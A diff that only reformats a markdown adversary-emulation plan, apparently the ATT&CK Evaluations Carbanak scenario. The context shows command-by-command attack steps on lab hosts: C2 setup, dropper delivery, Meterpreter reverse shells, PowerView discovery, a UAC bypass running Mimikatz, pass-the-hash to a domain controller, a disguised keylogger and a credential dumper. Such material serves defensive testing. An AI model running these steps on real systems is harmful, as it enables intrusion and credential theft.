@@ -56,6 +56,7 @@ On the `Attack Platform`:
     `tmux`
 
 2. Start the C2 Server
+
     ```
     cd carbanak/Resources/utilities/carbanak_c2server/c2server
     sudo ./c2server.elf -lhost 0.0.0.0:443 -ssl
@@ -68,11 +69,13 @@ If testing with Microsoft Word, perform the following. If not, perform [Step 1.B
 On the `Attack Platform`:
 
 1. Open a new `tmux` terminal
+
     ```
     Ctrl+b c
     ```
 
 2. Copy `1-list.rtf` to `<domain_admin>`'s Desktop on `hrmanager`.
+
     ```
     sudo smbclient -U '<domain_full>\<domain_admin>' //<hrmanager_ip>/C$ -c "put carbanak/Resources/step1/1-list.rtf Users\\<domain_admin>.<domain>\\Desktop\\1-list.rtf"
     ```
@@ -84,6 +87,7 @@ On the `Attack Platform`:
 On `hrmanager`:
 
 1. Login to victim workstation as `<domain_admin>`
+
     ```
     xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hrmanager_ip>
     ```
@@ -107,11 +111,13 @@ Perform the following on `hrmanager` if you're testing without Office licenses:
 On the `Attack Platform`:
 
 1. Open a new `tmux` terminal
+
     ```
     Ctrl+b c
     ```
 
 2. Copy `drop_payloads.vbe` to `hrmanager`
+
     ```
     sudo smbclient -U '<domain_full>\<domain_admin>' //<hrmanager_ip>/C$ -c "put carbanak/Resources/step1/drop-payloads.vbe Users\\<domain_admin>.<domain>\\Desktop\\drop-payloads.vbe"
     ```
@@ -123,6 +129,7 @@ On the `Attack Platform`:
 On hrmanager:
 
 1. Login to victim workstation as `<domain_admin>`
+
     ```
     xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hrmanager_ip>
     ```
@@ -130,6 +137,7 @@ On hrmanager:
 2. Open cmd.exe
 
 3. Manually execute VB script
+
     ```
     [hrmanager CMD]> cscript.exe C:\Users\<domain_admin>.<domain>\Desktop\drop-payloads.vbe
     ```
@@ -143,6 +151,7 @@ On the `Attack Platform`:
 1. Switch back to the Carbanak C2 server `tmux` window
 
 2. Get system information
+
     ```
     (ATT&CK Evals)> enum-system
     ```
@@ -150,46 +159,55 @@ On the `Attack Platform`:
 #### 1.D - Screen Capture ([T1113](https://attack.mitre.org/techniques/T1113/))
 
 1. Upload screenshot script
+
     ```
     (ATT&CK Evals)> upload-file /home/<attacker>/Enterprise/carbanak/Resources/step2/take-screenshot.ps1 "C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\screenshot__.ps1"
     ```
 
 2. Take Screenshot
+
     ```
     (ATT&CK Evals)> exec-cmd "powershell.exe C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\screenshot__.ps1"
     ```
 
 3. Exfil screenshot file over existing C2 channel
+
     ```
     (ATT&CK Evals)> download-file "C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\screenshot__.png" /tmp/screenshot__.png
     ```
 
 4. Switch to the other `tmux` terminal
+
     ```
     Ctrl-b + n
     ```
 
 5. Verify "screenshot__.png" download worked
+
     ```
     <attacker>@<attack_platform>>:~$ ls /tmp/
     ```
 
 6. Exit `tmux` Window
+
     ```
     exit
     ```
 
 7. Kill current session from C2 server
+
     ```
     (ATT&CK Evals)> exec-cmd taskkill /F /IM wscript.exe
     ```
 
 8. Exit C2 Server
+
     ```
     (ATT&CK Evals)> exit
     ```
 
 9. Close `tmux` session
+
     ```
     tmux kill-session
     ```
@@ -219,11 +237,13 @@ This step consists of behaviors found in Steps 3 and 4 of Scenario 1.
 On the `Attack Platform`:
 
 1. Start Metasploit
+
     ```
     sudo msfconsole
     ```
 
 2. Set up TCP listener for Meterpreter on TCP port 8080
+
     ```
     use exploit/multi/handler
     set payload windows/x64/meterpreter/reverse_tcp
@@ -291,11 +311,13 @@ On `hrmanager`:
 On the `Attack Platform`:
 
 1. Interact with new Meterpreter session
+
     ```
     msf > sessions -i 1
     ```
 
 2. Check Meterpreter session status
+
     ```
     meterpreter > getpid
     ```
@@ -303,26 +325,31 @@ On the `Attack Platform`:
 #### 2.D - Local and Domain Discovery ([T1083](https://attack.mitre.org/techniques/T1083/), [T1018](https://attack.mitre.org/techniques/T1018/), [T1069](https://attack.mitre.org/techniques/T1069/))
 
 1. Look for files in user home directory
+
     ```
     meterpreter > ls C:\\Users\\<domain_admin>.<domain>\\
     ```
 
 2. Load PowerShell into memory
+
     ```
     meterpreter > load powershell
     ```
 
 3. Import `PowerView` into memory
+
     ```
     meterpreter > powershell_import /home/<attacker>/Enterprise/carbanak/Resources/step6/powerview.ps1
     ```
 
 4. Execute `PowerView`'s `Get-NetComputer` from memory
+
     ```
     meterpreter > powershell_execute Get-NetComputer
     ```
 
 5. Execute `PowerView`'s `Find-LocalAdminAccess` from memory and write its output to a file on disk
+
     ```
     meterpreter > powershell_execute "Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt"
     ```
@@ -338,16 +365,19 @@ On the `Attack Platform`:
     Wait `60` seconds to allow the script to finish.
 
 6. Read the contents of the output file
+
     ```
     meterpreter > cat C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt
     ```
 
 7. Exit the Meterpreter session
+
     ```
     meterpreter > exit
     ```
 
 8. Exit Metasploit
+
     ```
     msf > exit
     ```
@@ -378,6 +408,7 @@ This step consists of behaviors found in Step 4 of Scenario 1.
 On `hrmanager`:
 
 1. Login to victim workstation as `<domain_admin>`
+
     ```
     xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hrmanager_ip>
     ```
@@ -397,6 +428,7 @@ On `hrmanager`:
 On the `Attack Platform`:
 
 1. Upload UAC Bypass script to `hrmanager`
+
     ```
     sudo smbclient -U '<domain_full>\<domain_admin>' //<hrmanager_ip>/C$ -c "put /home/<attacker>/Enterprise/carbanak/Resources/step4/uac-bypass.ps1 Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\rad353F7.ps1"
     ```
@@ -414,12 +446,14 @@ On the `Attack Platform`:
 Back on `hrmanager`:
 
 1. Execute the UAC Bypass script from a PowerShell window:
+
     ```
     cd C:\Users\<domain_admin>.<domain>\AppData\Roaming\TransbaseOdbcDriver\
     .\rad353F7.ps1
     ```
 
 2. Read Mimikatz output
+
     ```
     Get-Content "C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\MGsCOxPSNK.txt"
     ```
@@ -448,11 +482,13 @@ On the `Attack Platform`:
     `tmux`
 
 2. Start Metasploit
+
     ```
     sudo msfconsole
     ```
 
 3. Set up TCP listener for Meterpreter on TCP port 8080
+
     ```
     use exploit/multi/handler
     set payload windows/x64/meterpreter/reverse_tcp
@@ -463,11 +499,13 @@ On the `Attack Platform`:
     ```
 
 4. Open a new `tmux` terminal
+
     ```
     Ctrl+b c
     ```
 
 5. Copy needed files to the local staging folder (`/tmp/`)
+
     ```
     cp ~/Enterprise/carbanak/Resources/step5/impacket_exe /tmp/runtime
     cp ~/Enterprise/carbanak/Resources/step5/psexec.py /tmp/
@@ -476,6 +514,7 @@ On the `Attack Platform`:
     ```
 
 6. SCP those files to `bankfileserver`
+
     ```
     scp runtime psexec.py tiny.exe <domain_admin>@<bankfileserver_ip>:/tmp/
     ```
@@ -485,6 +524,7 @@ On the `Attack Platform`:
     `<domain_admin_password>`
 
 7. SSH into `bankfileserver` as `<domain_admin>`
+
     ```
     ssh <domain_admin>@<bankfileserver_ip>
     ```
@@ -493,18 +533,20 @@ On the `Attack Platform`:
 
     `<domain_admin_password>`
 
-
 8. Change to the `tmp` directory on `bankfileserver`
+
     ```
     <domain_admin>@bankfileserver:~$ cd /tmp/
     ```
 
 9. Modify permissions on `runtime` to make it world-executable
+
     ```
     <domain_admin>@bankfileserver:~$ chmod 755 /tmp/runtime
     ```
 
 10. Use `runtime` to execute `psexec.py` with the `<domain_admin>`'s password hash to connect to `bankdc`
+
     ```
     ./runtime psexec.py <domain_full>/<domain_admin>@<bankdc_ip> -hashes <domain_admin_password_ntlm_hash>
     ```
@@ -516,56 +558,67 @@ On the `Attack Platform`:
 1. Serve TinyMet over SMB
 
     From pass-the-hash shell:
+
     ```
     [bankdc CMD]> put tiny.exe
     ```
 
 2. Execute TinyMet
+
     ```
     [bankdc CMD]> start /b C:\Windows\tiny.exe 192.168.0.4 8080
     ```
 
 3. Switch back to the Metasploit `tmux` terminal
+
     ```
     Ctrl+b n
     ```
 
 4. Interact with the new **Tiny.exe** Meterpreter session
+
     ```
     sessions -i 1
     ```
 
 5. Verify the session works
+
     ```
     meterpreter > getpid
     ```
 
 6. Close Meterpreter
+
     ```
     meterpreter > exit
     ```
 
 7. Exit Metasploit
+
     ```
     msf > exit
     ```
 
 8. Switch to `psexec` shell
+
     ```
     Ctrl+b n
     ```
 
 9. Exit psexec shell
+
     ```
     [bankdc CMD]> exit
     ```
 
 10. Exit `bankfileserver` SSH session
+
     ```
     <domain_admin>@bankfileserver:~$ exit
     ```
 
 11. Exit `tmux` session
+
     ```
     tmux kill-session
     ```
@@ -590,6 +643,7 @@ This step consists of behaviors found in Step 9 of Scenario 1.
 On the `Attack Platform`:
 
 1. Upload the keylogger to the `cfo` workstation
+
     ```
     sudo smbclient -U '<domain_full>\<domain_admin>' //<cfo_ip>/C$ -c "put /home/<attacker>/Enterprise/carbanak/Resources/step9/keylogger.exe Users\\<cfo_user>\\AppData\\Local\Temp\\DefenderUpgradeExec.exe"
     ```
@@ -601,6 +655,7 @@ On the `Attack Platform`:
 On `cfo`:
 
 1. Login to the `cfo` workstation as the `<cfo_user>`
+
     ```
     xfreerdp +clipboard /u:"<cfo_user>@<domain_full>" /p:"<cfo_user_password>" /v:<cfo_ip>
     ```
@@ -608,12 +663,14 @@ On `cfo`:
 2. Open a PowerShell window
 
 2. Execute the keylogger
+
     ```
     cd $env:TEMP
     start-process .\DefenderUpgradeExec.exe -WindowStyle Hidden
     ```
 
 3. Mimic user behavior
+
     ```
     1. Open Edge, go to finance.yahoo.com
 
@@ -623,12 +680,14 @@ On `cfo`:
     ```
 
 4. Open `cmd.exe` and kill keylogger
+
     ```
     taskkill /F /IM DefenderUpgradeExec.exe
     exit
     ```
 
 5. Switch to PowerShell window and view keylogger dump
+
     ```
     get-content klog2.txt
     ```
@@ -638,6 +697,7 @@ On `cfo`:
 On the `Attack Platform`:
 
 1. Upload the Web Credential Dumper to the `cfo` workstation
+
     ```
     sudo smbclient -U '<domain_full>\<domain_admin>' //<cfo_ip>/C$ -c "put /home/<attacker>/Enterprise/carbanak/Resources/step9/dumpWebCreds.exe Users\\<cfo_user>\\AppData\\Local\\Temp\\infosMin48.exe"
     ```
@@ -649,6 +709,7 @@ On the `Attack Platform`:
 On the `cfo` workstation:
 
 2. Run the Web Cred Dumper from PowerShell
+
     ```
     .\infosMin48.exe
     ```
